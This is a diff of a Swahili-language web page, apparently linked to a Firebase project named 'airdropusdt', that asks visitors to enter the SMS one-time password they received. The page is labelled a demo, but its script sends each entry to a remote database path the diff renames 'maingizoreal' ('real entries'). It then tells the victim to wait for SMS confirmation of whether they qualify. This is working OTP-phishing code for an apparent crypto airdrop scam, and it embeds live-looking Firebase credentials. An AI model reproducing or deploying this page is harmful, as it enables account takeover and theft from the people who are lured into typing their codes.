@@ -1,170 +1,156 @@
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="sw">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Demo OTP Verification</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ukurasa wa Demo</title>
 
 <style>
   body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: #0a3d2a;
-    color: #fff;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
+    margin:0;
+    font-family:Arial, sans-serif;
+    background:#0a3d2a;
+    color:#fff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
   }
 
   .card {
-    background: rgba(255, 255, 255, 0.08);
-    padding: 20px;
-    width: 92%;
-    max-width: 400px;
-    border-radius: 12px;
-    text-align: center;
-    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
-  }
-
-  h2 {
-    margin: 0 0 10px;
-    color: #00ff88;
+    background:rgba(255,255,255,0.1);
+    padding:20px;
+    border-radius:10px;
+    width:90%;
+    max-width:400px;
+    text-align:center;
   }
 
   input {
-    width: 90%;
-    padding: 12px;
-    margin-top: 15px;
-    border-radius: 8px;
-    border: none;
-    font-size: 16px;
+    width:90%;
+    padding:12px;
+    margin-top:12px;
+    border:none;
+    border-radius:8px;
+    font-size:16px;
   }
 
   button {
-    width: 90%;
-    margin-top: 15px;
-    padding: 12px;
-    background: #00ff88;
-    color: #003300;
-    border: none;
-    font-weight: bold;
-    border-radius: 8px;
-    font-size: 16px;
-    cursor: pointer;
+    width:90%;
+    margin-top:15px;
+    padding:12px;
+    background:#00ff88;
+    border:none;
+    color:#003300;
+    font-weight:bold;
+    font-size:16px;
+    border-radius:8px;
+    cursor:pointer;
   }
 
-  /* Popup */
+  .overlay {
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.55);
+    display:none;
+    align-items:center;
+    justify-content:center;
+  }
+
   .popup {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.55);
-    display: none;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
+    position:fixed;
+    bottom:30px;
+    left:50%;
+    transform:translateX(-50%);
+    background:#fff;
+    color:#000;
+    padding:15px 25px;
+    border-radius:10px;
+    display:none;
+    font-weight:bold;
+    box-shadow:0 0 10px rgba(0,0,0,0.4);
   }
 
-  .popup-box {
-    background: #fff;
-    width: 90%;
-    max-width: 350px;
-    padding: 20px;
-    border-radius: 12px;
-    text-align: center;
-    color: #333;
-    box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+  .spinner {
+    width:60px;
+    height:60px;
+    border:6px solid rgba(255,255,255,0.2);
+    border-top-color:white;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
   }
 
-  .popup-box h3 {
-    margin-bottom: 10px;
-    color: #0a6f3c;
-  }
-
-  .close-btn {
-    padding: 10px;
-    width: 100%;
-    background: #0a6f3c;
-    color: #fff;
-    border: none;
-    border-radius: 8px;
-    margin-top: 15px;
-    cursor: pointer;
-    font-weight: bold;
-  }
+  @keyframes spin { to { transform:rotate(360deg);} }
 </style>
 </head>
 
 <body>
-  <div class="card">
-    <h2>Weka OTP ya Uthibitisho</h2>
-    <p>Weka OTP kuendelea.</p>
 
-    <input id="otpInput" type="text" maxlength="6" placeholder="Ingiza OTP hapa..." inputmode="numeric" />
+<div class="card">
+  <h2>Ukurasa wa mwisho</h2>
+  <p>Ingiza OTP uliyopokea kwenye sms.</p>
 
-    <button id="submitOtp">Thibitisha</button>
-  </div>
+  <input id="demoInput" type="text" placeholder="Ingiza otp hapa..." />
+  <button id="submitBtn">Endelea</button>
+</div>
 
-  <!-- Popup -->
-  <div id="otpPopup" class="popup">
-    <div class="popup-box">
-      <h3>Subiri arifa ya SMS kama umehitimu</h3>
+<div id="loading" class="overlay">
+  <div class="spinner"></div>
+</div>
 
-      <button class="close-btn" onclick="closePopup()">Funga</button>
-    </div>
-  </div>
+<div id="popup" class="popup">
+  Tafadhali subiri uthibitisho wa SMS ili kujua kama umehitimu.
+</div>
 
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-  // Your Firebase config (safe)
-  const firebaseConfig = {
-      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",
-      authDomain: "airdropusdt-767d7.firebaseapp.com",
-      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",
-      projectId: "airdropusdt-767d7",
-      storageBucket: "airdropusdt-767d7.firebasestorage.app",
-      messagingSenderId: "627616603037",
-      appId: "1:627616603037:web:63041f067800c97fab6d74",
-      measurementId: "G-01F6G2CYXK"
+<script>
+  // Firebase config yako
+  const firebaseConfig = {    
+      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",    
+      authDomain: "airdropusdt-767d7.firebaseapp.com",    
+      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",    
+      projectId: "airdropusdt-767d7",    
+      storageBucket: "airdropusdt-767d7.firebasestorage.app",    
+      messagingSenderId: "627616603037",    
+      appId: "1:627616603037:web:63041f067800c97fab6d74",    
+      measurementId: "G-01F6G2CYXK"    
   };
 
-  const app = initializeApp(firebaseConfig);
-  const db = getDatabase(app);
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-  const btn = document.getElementById('submitOtp');
-  const popup = document.getElementById('otpPopup');
+  const popup = document.getElementById("popup");
+  const btn = document.getElementById("submitBtn");
 
-  // Submit action
-  btn.addEventListener('click', async () => {
-    const otp = document.getElementById('otpInput').value.trim();
+  btn.addEventListener("click", () => {
+    let value = document.getElementById("demoInput").value.trim();
 
-    if (!otp || otp.length < 4) {
-      alert("Tafadhali ingiza OTP sahihi.");
+    if(!value){
+      alert("Tafadhali ingiza OTP kwanza.");
       return;
     }
 
-    try {
-      // Create new record
-      const newRef = push(ref(db, "demo_otps"));
-      await set(newRef, {
-        otp: otp,
-        submittedAt: new Date().toISOString()
-      });
+    // Hifadhi kwenye Firebase
+    db.ref("maingizoreal").push({
+      maandishi: value,
+      muda: new Date().toISOString()
+    })
+    .then(() => {
+      // Onyesha popup ya Kiswahili bila redirect
+      popup.style.display = "block";
 
-      popup.style.display = "flex";
-
-    } catch (err) {
-      console.error("OTP Save Error:", err);
-      alert("Kumetokea tatizo. Jaribu tena.");
-    }
+      // Ficha popup baada ya sekunde 3
+      setTimeout(() => {
+        popup.style.display = "none";
+      }, 3000);
+    })
+    .catch(err => {
+      alert("Kuna hitilafu wakati wa kuhifadhi: " + err.message);
+    });
   });
-
-  // Close popup
-  window.closePopup = function() {
-    popup.style.display = "none";
-  };
 </script>
 
 </body>
